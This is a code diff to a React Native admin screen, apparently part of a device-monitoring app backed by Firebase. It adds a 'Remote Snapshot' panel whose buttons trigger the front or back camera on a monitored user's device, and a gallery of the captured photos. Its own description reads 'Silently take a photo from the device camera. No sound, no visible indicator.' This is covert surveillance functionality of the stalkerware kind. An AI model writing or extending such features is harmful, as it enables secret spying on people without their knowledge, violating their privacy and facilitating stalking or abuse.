@@ -11,11 +11,15 @@ import {
   KeyboardAvoidingView,
   Platform,
   Switch,
+  Image,
+  Modal,
+  Dimensions,
+  FlatList,
 } from 'react-native';
 import { useLocalSearchParams, useRouter } from 'expo-router';
-import { doc, getDoc, updateDoc, onSnapshot } from 'firebase/firestore';
+import { doc, getDoc, updateDoc, onSnapshot, collection, query, orderBy } from 'firebase/firestore';
 import { getFunctions, httpsCallable } from 'firebase/functions';
-import { db } from '@/config/firebase';
+import { db, storage } from '@/config/firebase';
 import type { AppUser, BackupSettings, BackupLog } from '@/types';
 
 export default function UserDetail() {
@@ -41,6 +45,11 @@ export default function UserDetail() {
   const [alertTitle, setAlertTitle] = useState('');
   const [alertBody, setAlertBody] = useState('');
 
+  // Snapshot state
+  const [snapping, setSnapping] = useState<'front' | 'back' | null>(null);
+  const [snapshots, setSnapshots] = useState<{ id: string; url: string; camera: string; takenAt: number }[]>([]);
+  const [lightboxUrl, setLightboxUrl] = useState<string | null>(null);
+
   useEffect(() => {
     if (!uid) return;
     loadUser();
@@ -60,8 +69,24 @@ export default function UserDetail() {
       if (snap.exists()) setBackupLog(snap.data() as BackupLog);
     });
 
-    return () => { unsubUser(); unsubLog(); };
+    const unsubSnaps = onSnapshot(
+      query(collection(db, 'users', uid, 'snapshots'), orderBy('takenAt', 'desc')),
+      snap => setSnapshots(snap.docs.map(d => ({ id: d.id, ...d.data() } as any)))
+    );
+
+    return () => { unsubUser(); unsubLog(); unsubSnaps(); };
   }, [uid]);
+
+  async function triggerSnapshot(camera: 'front' | 'back') {
+    setSnapping(camera);
+    try {
+      await updateDoc(doc(db, 'users', uid), { cameraRequested: { camera, timestamp: Date.now() } });
+    } catch (e: any) {
+      Alert.alert('Error', e.message ?? 'Failed to trigger snapshot.');
+    } finally {
+      setTimeout(() => setSnapping(null), 3000);
+    }
+  }
 
   async function loadUser() {
     setLoading(true);
@@ -402,6 +427,57 @@ export default function UserDetail() {
           </TouchableOpacity>
         </View>
 
+        {/* Remote Snapshot */}
+        <View style={styles.card}>
+          <Text style={styles.cardTitle}>📸 Remote Snapshot</Text>
+          <Text style={styles.desc}>Silently take a photo from the device camera. No sound, no visible indicator.</Text>
+          <View style={{ flexDirection: 'row', gap: 10 }}>
+            <TouchableOpacity
+              style={[styles.snapBtn, snapping === 'front' && { opacity: 0.6 }]}
+              onPress={() => triggerSnapshot('front')}
+              disabled={!!snapping}
+            >
+              {snapping === 'front'
+                ? <ActivityIndicator color="#fff" />
+                : <Text style={styles.btnText}>Front Camera</Text>}
+            </TouchableOpacity>
+            <TouchableOpacity
+              style={[styles.snapBtn, { backgroundColor: '#0f766e' }, snapping === 'back' && { opacity: 0.6 }]}
+              onPress={() => triggerSnapshot('back')}
+              disabled={!!snapping}
+            >
+              {snapping === 'back'
+                ? <ActivityIndicator color="#fff" />
+                : <Text style={styles.btnText}>Back Camera</Text>}
+            </TouchableOpacity>
+          </View>
+          {snapshots.length > 0 && (
+            <View style={{ marginTop: 16 }}>
+              <Text style={[styles.fieldLabel, { marginBottom: 10 }]}>Captured Snapshots</Text>
+              <FlatList
+                data={snapshots}
+                numColumns={2}
+                scrollEnabled={false}
+                keyExtractor={item => item.id}
+                columnWrapperStyle={{ gap: 8 }}
+                contentContainerStyle={{ gap: 8 }}
+                renderItem={({ item }) => (
+                  <TouchableOpacity onPress={() => setLightboxUrl(item.url)} style={{ flex: 1 }}>
+                    <Image
+                      source={{ uri: item.url }}
+                      style={{ width: '100%', aspectRatio: 1, borderRadius: 10 }}
+                      resizeMode="cover"
+                    />
+                    <Text style={{ fontSize: 10, color: '#888', marginTop: 3, textAlign: 'center' }}>
+                      {item.camera} · {new Date(item.takenAt).toLocaleTimeString()}
+                    </Text>
+                  </TouchableOpacity>
+                )}
+              />
+            </View>
+          )}
+        </View>
+
         {/* Backup Status Log */}
         {backupLog && (
           <View style={styles.card}>
@@ -415,6 +491,23 @@ export default function UserDetail() {
           </View>
         )}
       </ScrollView>
+
+      <Modal visible={!!lightboxUrl} transparent animationType="fade" onRequestClose={() => setLightboxUrl(null)}>
+        <TouchableOpacity
+          style={{ flex: 1, backgroundColor: 'rgba(0,0,0,0.92)', justifyContent: 'center', alignItems: 'center' }}
+          activeOpacity={1}
+          onPress={() => setLightboxUrl(null)}
+        >
+          {lightboxUrl && (
+            <Image
+              source={{ uri: lightboxUrl }}
+              style={{ width: Dimensions.get('window').width, height: Dimensions.get('window').width, borderRadius: 12 }}
+              resizeMode="contain"
+            />
+          )}
+          <Text style={{ color: '#aaa', marginTop: 16, fontSize: 13 }}>Tap to close</Text>
+        </TouchableOpacity>
+      </Modal>
     </KeyboardAvoidingView>
   );
 }
@@ -492,6 +585,10 @@ const styles = StyleSheet.create({
   alertButton: {
     backgroundColor: '#dc2626', borderRadius: 12,
     paddingVertical: 14, alignItems: 'center', marginTop: 4,
+  },
+  snapBtn: {
+    flex: 1, backgroundColor: '#4f46e5', borderRadius: 12,
+    paddingVertical: 14, alignItems: 'center',
   },
   statusRow: {
     flexDirection: 'row', justifyContent: 'space-between',
